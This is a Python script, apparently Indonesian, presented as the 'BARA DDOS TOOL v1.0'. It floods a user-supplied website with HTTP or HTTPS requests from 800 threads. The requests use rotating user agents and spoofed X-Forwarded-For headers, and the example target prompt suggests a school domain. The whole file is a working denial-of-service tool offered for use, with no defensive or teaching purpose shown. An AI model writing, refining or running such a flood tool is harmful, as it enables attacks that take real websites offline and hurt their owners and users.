#!/usr/bin/env python3
import socket, ssl, threading, random, time, sys, os, hashlib

# ===================== KONFIG =====================
KODE_VERIF = "bara2026"     # kode verifikasi
MAX_THREAD = 800
BANNER = r"""
\033[91m
██████╗  █████╗ ██████╗  █████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║██████╔╝███████║
██╔══██╗██╔══██║██╔══██╗██╔══██║
██████╔╝██║  ██║██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
        \033[93mBARA DDOS TOOL v1.0\033[91m
\033[0m\033[92m     [ Author : Bara ] [ Catuk : Aurelia ]\033[0m
\033[96m=====================================\033[0m
"""

ctx = ssl._create_unverified_context()
stats = {"req": 0, "err": 0}
stop_flag = False

# ===================== UTIL =====================
def cls():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    cls()
    print(BANNER)

def verifikasi():
    print("\033[93m[!] VERIFIKASI DIPERLUKAN SEBELUM GAS\033[0m")
    kode = input("\033[92m[?] Masukkan kode verifikasi: \033[0m").strip()
    if hashlib.sha256(kode.encode()).hexdigest() != hashlib.sha256(KODE_VERIF.encode()).hexdigest():
        print("\033[91m[X] KODE SALAH! Akses ditolak.\033[0m")
        time.sleep(2)
        sys.exit(1)
    print("\033[92m[✓] Verifikasi BARA berhasil! Lanjut gas...\033[0m")
    time.sleep(1)

def random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) Safari/604.1",
        "Mozilla/5.0 (Android 13; Mobile) Chrome/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1",
    ]
    return random.choice(uas)

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# ===================== PAYLOAD =====================
def build_payload(host, path):
    method = random.choice(["GET", "POST", "HEAD", "PUT", "OPTIONS"])
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random_ua()}\r\n"
        f"Accept: */*\r\n"
        f"Accept-Language: id-ID,id;q=0.9\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Connection: keep-alive\r\n"
        f"Cache-Control: no-cache, no-store\r\n"
        f"Pragma: no-cache\r\n"
        f"X-Forwarded-For: {random_ip()}\r\n"
        f"X-Real-IP: {random_ip()}\r\n"
        f"Referer: https://{host}/\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode()

# ===================== WORKER =====================
def worker(host, port, path, use_ssl):
    global stop_flag
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if use_ssl:
                ss = ctx.wrap_socket(s, server_hostname=host)
                ss.connect((host, port))
                sock = ss
            else:
                s.connect((host, port))
                sock = s
            for _ in range(30):
                if stop_flag:
                    break
                sock.send(build_payload(host, path))
                stats["req"] += 1
            sock.close()
        except Exception:
            stats["err"] += 1

def monitor():
    while not stop_flag:
        time.sleep(1)
        sys.stdout.write(
            f"\r\033[92m[BARA] Req: {stats['req']}  |  Err: {stats['err']}  |  Thread: {threading.active_count()-1}\033[0m"
        )
        sys.stdout.flush()

# ===================== MENU =====================
def menu_metode():
    print("\033[96m=========== BARA DDOS ===========\033[0m")
    print("\033[92m[1]\033[0m HTTPS Flood (default, pasti jalan)")
    print("\033[92m[2]\033[0m HTTP Flood")
    print("\033[92m[3]\033[0m Exit")
    print("\033[96m=================================\033[0m")
    return input("\033[92m[?] Pilih metode: \033[0m").strip()

# ===================== MAIN =====================
def main():
    global stop_flag
    banner()
    verifikasi()

    metode = menu_metode()
    if metode == "3":
        print("\033[91m[X] Keluar dari BARA DDOS.\033[0m")
        sys.exit(0)

    url = input("\033[92m[?] Input website target (contoh: sekolah.sch.id): \033[0m").strip()
    if not url.startswith("http"):
        url = ("https://" if metode == "1" else "http://") + url

    use_ssl = url.startswith("https")
    raw = url.replace("https://", "").replace("http://", "").split("/")
    host = raw[0]
    path = "/" + "/".join(raw[1:]) if len(raw) > 1 and raw[1] else "/"
    port = 443 if use_ssl else 80

    try:
        ip = socket.gethostbyname(host)
    except:
        print("\033[91m[X] Domain tidak ditemukan!\033[0m")
        sys.exit(1)

    print(f"\n\033[93m[*] Target : {host}\033[0m")
    print(f"\033[93m[*] IP     : {ip}\033[0m")
    print(f"\033[93m[*] Port   : {port}\033[0m")
    print(f"\033[93m[*] SSL    : {use_ssl}\033[0m")
    print(f"\033[93m[*] Thread : {MAX_THREAD}\033[0m")
    print("\033[91m[*] BARA GAS... (Ctrl+C untuk stop)\033[0m\n")
    time.sleep(2)

    for _ in range(MAX_THREAD):
        t = threading.Thread(target=worker, args=(host, port, path, use_ssl), daemon=True)
        t.start()

    threading.Thread(target=monitor, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        time.sleep(1)
        print(f"\n\033[92m[✓] BARA stop. Total request: {stats['req']}\033[0m")

if __name__ == "__main__":
    main()
